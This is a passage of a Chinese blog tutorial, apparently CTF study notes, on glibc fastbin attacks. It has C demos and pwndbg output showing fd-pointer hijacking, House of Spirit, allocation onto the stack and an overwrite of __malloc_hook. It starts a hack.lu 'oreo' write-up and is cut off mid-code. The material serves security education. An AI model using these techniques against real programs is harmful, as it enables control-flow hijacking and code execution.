<span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>chunk_a<span class="token operator">=</span><span class="token operator">&amp;</span>bss_chunk<span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk_b<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p"</span><span class="token punctuation">,</span>chunk_b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>结果：</p><pre class=" language-c"><code class="language-c">   <span class="token number">27</span>     chunk_a<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">28</span>     <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>chunk_a<span class="token operator">=</span><span class="token operator">&amp;</span>bss_chunk<span class="token punctuation">;</span> ► <span class="token number">29</span>     <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">30</span>     <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">31</span>     chunk_b<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">32</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p"</span><span class="token punctuation">,</span>chunk_b<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token number">33</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token number">34</span> <span class="token punctuation">}</span>──────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────────<span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0000</span>│ rsp  <span class="token number">0x7fffffffde00</span> —▸ <span class="token number">0x602010</span> —▸ <span class="token function">0x601080</span> <span class="token punctuation">(</span>bss_chunk<span class="token punctuation">)</span> ◂— <span class="token number">0x0</span><span class="token number">01</span><span class="token punctuation">:</span><span class="token number">0008</span>│      <span class="token number">0x7fffffffde08</span> —▸ <span class="token number">0x602030</span> —▸ <span class="token number">0x602000</span> ◂— <span class="token number">0x0</span><span class="token number">02</span><span class="token punctuation">:</span><span class="token number">0010</span>│      <span class="token number">0x7fffffffde10</span> —▸ <span class="token number">0x602010</span> —▸ <span class="token function">0x601080</span> <span class="token punctuation">(</span>bss_chunk<span class="token punctuation">)</span> ◂— <span class="token number">0x0</span><span class="token number">03</span><span class="token punctuation">:</span><span class="token number">0018</span>│      <span class="token number">0x7fffffffde18</span> ◂— <span class="token number">0x0</span><span class="token number">04</span><span class="token punctuation">:</span><span class="token number">0020</span>│ rbp  <span class="token number">0x7fffffffde20</span> —▸ <span class="token function">0x400670</span> <span class="token punctuation">(</span>__libc_csu_init<span class="token punctuation">)</span> ◂— push   r15<span class="token number">05</span><span class="token punctuation">:</span><span class="token number">0028</span>│      <span class="token number">0x7fffffffde28</span> —▸ <span class="token function">0x7ffff7a2d840</span> <span class="token punctuation">(</span>__libc_start_main<span class="token operator">+</span><span class="token number">240</span><span class="token punctuation">)</span> ◂— mov    edi<span class="token punctuation">,</span> eax<span class="token number">06</span><span class="token punctuation">:</span><span class="token number">0030</span>│      <span class="token number">0x7fffffffde30</span> ◂— <span class="token number">0x1</span><span class="token number">07</span><span class="token punctuation">:</span><span class="token number">0038</span>│      <span class="token number">0x7fffffffde38</span> —▸ <span class="token number">0x7fffffffdf08</span> —▸ <span class="token number">0x7fffffffe27d</span> ◂— <span class="token string">'/home/matrix/PWN/how2heap/wiki_heap/fastbin_attach/test2'</span>────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────── ► f <span class="token number">0</span>           <span class="token number">400623</span> main<span class="token operator">+</span><span class="token number">109</span>   f <span class="token number">1</span>     7ffff7a2d840 __libc_start_main<span class="token operator">+</span><span class="token number">240</span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg<span class="token operator">></span> <span class="token function">heapinfo</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>     fastbin<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token number">0x602020</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x602000</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x601080</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x0</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span>     fastbin<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token number">0x0</span></code></pre><p>可以看到最后的chunk0x601080 就是bss段的地址<br>值得注意的是，我们在 main 函数的第一步就进行了<strong>bss_chunk.size=0x21;的操作</strong>，这是因为<strong>_int_malloc 会对欲分配位置的 size 域进行验证</strong>，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。</p><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>House of Spirit 是 the Malloc Maleficarum 中的一种技术。<br>该技术的核心在于在<strong>目标位置处伪造 fastbin chunk，并将其释放</strong>，从而达到*<em>分配指定地址的 chunk *</em>的目的。</p><p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p><ul><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li><li>fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ul><p>可以看出，想要使用该技术分配 chunk 到指定地址，其实并<strong>不需要修改指定地址的任何内容</strong>，关键是要能够<strong>修改指定地址的前后的内容</strong>使其可以绕过对应的检测。</p><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>和上面的利用方法很像，它们的本质都在于 fastbin 链表的特性：当前 chunk 的 fd 指针指向下一个 chunk。<br>该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，<strong>把 fd 指针指向我们想要分配的栈上</strong>，从而实现控制栈中的一些关键数据，比如<strong>返回地址</strong>等。</p><h3 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h3><p>这次我们把 fake_chunk 置于栈中称为 stack_chunk，同时劫持了 fastbin 链表中 chunk 的 fd 值，*<em>通过把这个 fd 值指向 stack_chunk *</em>就可以实现在栈中分配 fastbin chunk。</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> _chunk<span class="token punctuation">{</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> pre_size<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> size<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> fd<span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> bk<span class="token punctuation">;</span><span class="token punctuation">}</span> CHUNK<span class="token punctuation">,</span><span class="token operator">*</span>PCHUNK<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    CHUNK stack_chunk<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk_a<span class="token punctuation">;</span>    stack_chunk<span class="token punctuation">.</span>size<span class="token operator">=</span><span class="token number">0x21</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//满足malloc的size和fatsbins下标匹配</span>    chunk1<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>chunk1<span class="token operator">=</span><span class="token operator">&amp;</span>stack_chunk<span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk_a<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//printf("%p\n",&amp;chunk_a);</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在*(long long *)chunk1=&stack_chunk;之后：</p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> <span class="token function">heapinfo</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>     fastbin<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">0x602000</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x7fffffffddf0</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x400650</span> <span class="token punctuation">(</span>size <span class="token function">error</span> <span class="token punctuation">(</span><span class="token number">0x7ae258d4c544150</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x7ae2d8d48550020</span> <span class="token punctuation">(</span>invaild memory<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span>     fastbin<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token function">0x0</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>     fastbin<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">0x0</span></code></pre><p>那么malloc掉0x602000 后再次malloc就会返回0x7fffffffddf0处的内存空间，即<strong>可泄露栈内容，或者修改栈</strong></p><p>通过该技术我们可以把 fastbin chunk 分配到栈中，从而<strong>控制返回地址等关键数据</strong>。要实现这一点我们需要劫持 <strong>fastbin 中 chunk 的 fd 域</strong>，把它指到栈上，当然同时需要<strong>栈上存在有满足条件的 size 值</strong></p><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><h3 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h3><p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，<strong>唯一的区别是分配的目标不再是栈中</strong>。 事实上只要满足目标地址存在<strong>合法的 size 域</strong>（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如** bss、heap、data、stack **等等。</p><h3 id="演示-2"><a href="#演示-2" class="headerlink" title="演示"></a>演示</h3><p>在这个例子，我们使用<strong>字节错位</strong>来实现直接分配 fastbin 到_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk1<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>chunk_a<span class="token punctuation">;</span>    chunk1<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>chunk1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span>chunk1<span class="token operator">=</span><span class="token number">0x7ffff7dd1af5</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    chunk_a<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>（和wiki上的一模一样）这里的 0x7ffff7dd1af5 是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。</p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> <span class="token number">0x7ffff7dd1af0</span> <span class="token operator">&lt;</span>_IO_wide_data_0<span class="token operator">+</span><span class="token number">304</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x60</span>    <span class="token number">0x02</span>    <span class="token number">0xdd</span>    <span class="token number">0xf7</span>    <span class="token number">0xff</span>    <span class="token number">0x7f</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span><span class="token number">0x7ffff7dd1af8</span><span class="token operator">:</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span><span class="token number">0x7ffff7dd1b00</span> <span class="token operator">&lt;</span>__memalign_hook<span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0xa0</span>    <span class="token number">0x2e</span>    <span class="token number">0xa9</span>    <span class="token number">0xf7</span>    <span class="token number">0xff</span>    <span class="token number">0x7f</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span><span class="token number">0x7ffff7dd1b08</span> <span class="token operator">&lt;</span>__realloc_hook<span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x70</span>    <span class="token number">0x2a</span>    <span class="token number">0xa9</span>    <span class="token number">0xf7</span>    <span class="token number">0xff</span>    <span class="token number">0x7f</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>pwndbg<span class="token operator">></span> <span class="token number">0x7ffff7dd1b10</span> <span class="token operator">&lt;</span>__malloc_hook<span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0xa0</span>    <span class="token number">0x28</span>    <span class="token number">0xa9</span>    <span class="token number">0xf7</span>    <span class="token number">0xff</span>    <span class="token number">0x7f</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span><span class="token number">0x7ffff7dd1b18</span><span class="token operator">:</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span><span class="token number">0x7ffff7dd1b20</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span><span class="token number">0x7ffff7dd1b28</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>    <span class="token number">0x00</span>pwndbg<span class="token operator">></span> x<span class="token operator">/</span>32gx <span class="token number">0x7ffff7dd1af5</span>                      <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token number">0x7ffff7dd1af5</span> <span class="token operator">&lt;</span>_IO_wide_data_0<span class="token operator">+</span><span class="token number">309</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x000000000000007f</span>    <span class="token number">0xfff7a92ea0000000</span><span class="token number">0x7ffff7dd1b05</span> <span class="token operator">&lt;</span>__memalign_hook<span class="token operator">+</span><span class="token number">5</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0xfff7a92a7000007f</span>    <span class="token number">0x000000000000007f</span><span class="token number">0x7ffff7dd1b15</span> <span class="token operator">&lt;</span>__malloc_hook<span class="token operator">+</span><span class="token number">5</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span></code></pre><p>这里选择0x7ffff7dd1af5，其实我们在64位下size字段一般占8字节但是在利用宏计算 fastbin index 时：</p><pre class=" language-c"><code class="language-c">##define <span class="token function">fastbin_index</span><span class="token punctuation">(</span>sz<span class="token punctuation">)</span>                                                      \    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token punctuation">(</span>SIZE_SZ <span class="token operator">==</span> <span class="token number">8</span> <span class="token operator">?</span> <span class="token number">4</span> <span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span>   </code></pre><p>这里的size是unsigned int只有4字节，并且这里的0x000000000000007f    并没有16字节对齐，但是在fastbin_index计算过程中：0x7f &gt;&gt; 4 == 0x7, 0x7 - 2 == 5 .可以获取对应下标。</p><pre class=" language-java"><code class="language-java">pwndbg<span class="token operator">></span> parseheap addr                prev                size                 status              fd                bk                <span class="token number">0x602000</span>            <span class="token number">0x0</span>                 <span class="token number">0x70</span>                 Freed     <span class="token number">0x7ffff7dd1aed</span>              Nonepwndbg<span class="token operator">></span> <span class="token function">heapinfo</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>     fastbin<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token function">0x0</span><span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span>     fastbin<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token function">0x0</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>     fastbin<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token function">0x0</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span>     fastbin<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token function">0x0</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>     fastbin<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token function">0x0</span><span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span>     fastbin<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">0x602000</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x7ffff7dd1aed</span> <span class="token punctuation">(</span>size <span class="token function">error</span> <span class="token punctuation">(</span><span class="token number">0x78</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0xfff7a92ea0000000</span> <span class="token punctuation">(</span>invaild memory<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>     fastbin<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token function">0x0</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>     fastbin<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">0x0</span></code></pre><p>但是还有一个问题就是地址没有对齐，那我们来看看malloc源码对fastbin chunk是如何检查的：</p><pre class=" language-c"><code class="language-c">   <span class="token comment" spellcheck="true">/*       If the size qualifies as a fastbin, first check corresponding bin.       This code is safe to execute even if av is not yet initialized, so we       can try it without checking, which saves some time on this fast path.     */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">get_max_fast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//由nb获取对应fastbins的index</span>        idx             <span class="token operator">=</span> <span class="token function">fastbin_index</span><span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//可以看出这是exact fit</span>        <span class="token comment" spellcheck="true">//fastbinsY中获取对应index的free chunk</span>        mfastbinptr <span class="token operator">*</span>fb <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token function">fastbin</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span>        mchunkptr    pp <span class="token operator">=</span> <span class="token operator">*</span>fb<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//fb中存放&amp;fastbinsY[index]，mchunkptr存放fastbinsY[index]的free chunk地址</span>        <span class="token comment" spellcheck="true">// 利用fd遍历对应的bin内是否有空闲的chunk块，</span>        <span class="token keyword">do</span> <span class="token punctuation">{</span>            victim <span class="token operator">=</span> pp<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>victim <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pp <span class="token operator">=</span> <span class="token function">catomic_compare_and_exchange_val_acq</span><span class="token punctuation">(</span>fb<span class="token punctuation">,</span> victim<span class="token operator">-></span>fd<span class="token punctuation">,</span>                                                            victim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 存在可以利用的chunk</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>victim <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。</span>            <span class="token comment" spellcheck="true">// 根据取得的 victim ，利用 chunksize 计算其大小。</span>            <span class="token comment" spellcheck="true">// 利用fastbin_index 计算 chunk 的索引。</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span><span class="token punctuation">(</span><span class="token function">fastbin_index</span><span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>这里用了fastbin_index，是无法验证size是否对齐的                errstr <span class="token operator">=</span> <span class="token string">"malloc(): memory corruption (fast)"</span><span class="token punctuation">;</span>            errout<span class="token punctuation">:</span>                <span class="token function">malloc_printerr</span><span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> errstr<span class="token punctuation">,</span> <span class="token function">chunk2mem</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 细致的检查。。只有在 DEBUG 的时候有用</span>            <span class="token function">check_remalloced_chunk</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 将获取的到chunk转换为mem模式</span>            <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span>            <span class="token function">alloc_perturb</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> p<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//返回mem地址</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>所以malloc对fastbin chunk的地址对齐都是没有检查的。</p><p>那么之后分配到<strong>接近__malloc_hook的地址</strong>，就可以覆盖__malloc_hook内容实现hook劫持<br><strong>Arbitrary Alloc 在 CTF 中用地更加频繁</strong>。我们可以利用*<em>字节错位等方法来绕过 size *</em>域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值<br>这个在本地很容易实现，那在远程呢？可以先在本地算出fake_hook_chunk相对于libc的偏移</p><h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>不难看出Fastbin Attack的几种攻击都离不开fd覆盖，与fake_chunk伪造,在进行fake_chunk伪造时需要考虑的条件多一点fake_chunk-&gt;size以及nextchunk-&gt;size,而fd覆盖则只需控制好fake_chunk的size就好</p><h2 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><pre class=" language-java"><code class="language-java">matrix<span class="token annotation punctuation">@ubuntu</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>how2heap<span class="token operator">/</span>wiki_heap<span class="token operator">/</span>fastbin_attach$ checksec oreo<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/matrix/PWN/how2heap/wiki_heap/fastbin_attach/oreo'</span>    Arch<span class="token operator">:</span>     i386<span class="token operator">-</span><span class="token number">32</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    No RELRO    Stack<span class="token operator">:</span>    Canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x8048000</span><span class="token punctuation">)</span></code></pre><p>RELRO  PIE关闭</p><h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">sub_804898D</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-Ch]</span>  v1 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What would you like to do?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%u. Add new rifle\n"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token 